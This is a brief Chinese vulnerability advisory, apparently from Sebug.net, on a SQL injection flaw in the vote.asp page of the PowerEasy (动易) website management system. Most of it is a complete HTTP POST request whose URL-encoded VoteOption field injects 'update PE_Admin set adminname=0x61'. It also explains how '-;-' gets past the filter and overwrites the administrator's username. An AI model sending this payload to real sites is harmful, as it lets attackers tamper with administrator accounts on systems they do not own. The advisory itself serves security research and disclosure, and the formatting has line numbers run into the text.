@@ -1,0 +1,6 @@
+动易网站管理系统vote.asp页面存在SQL注入漏洞
+
+测试方法:
+
+@Sebug.net   dis
+本站提供程序(方法)可能带有攻击性,仅供安全研究与教学之用,风险自负!1.POST Vote.asp HTTP/1.12.Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*3.Referer: http://127.0.0.1/Vote.asp?ID=2&Action=Show4.Accept-Language: zh-cn5.Content-Type: application/x-www-form-urlencoded6.Accept-Encoding: gzip, deflate7.User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)8.Host: 127.0.0.19.Content-Length: 16010.Connection: Keep-Alive11.Cache-Control: no-cache12.Cookie: rtime=0; ltime=1191765883073; cnzz_eid=6855133-; AJSTAT_ok_times=2; ViewMode=1; PJBlog2Setting=ViewType=normal; http%3A%2F%2Fkw%2Elyedu%2Ecom%2Ecn=lao=8; style=null; chkRemember=false; ASPSESSIONIDSSRCABTA=JJODPHAACKPHCFNFCKEINALN; VotedID=113. 14.VoteOption=1%3D1+%75%70%64%61%74%65%20%50%45%5F%41%64%6D%69%6E%20%73%65%74%20%61%64%6D%69%6E%6E%61%6D%65%3D%30%78%36%31%2D%3B%2D&VoteType=Multi&Action=Vote&ID=215. 16.其中 1%3D1+%75%70%64%61%74%65%20%50%45%5F%41%64%6D%69%6E%20%73%65%74%20%61%64%6D%69%6E%6E%61%6D%65%3D%30%78%36%31%2D%3B%2D解码后为17.1=1+update PE_Admin set adminname=0x61-;-18.他们先过滤了--再过滤; 导致以-;-的形式可以很轻松的把注释符带入语句，执行语句后，成功把管理员的用户名设置为a
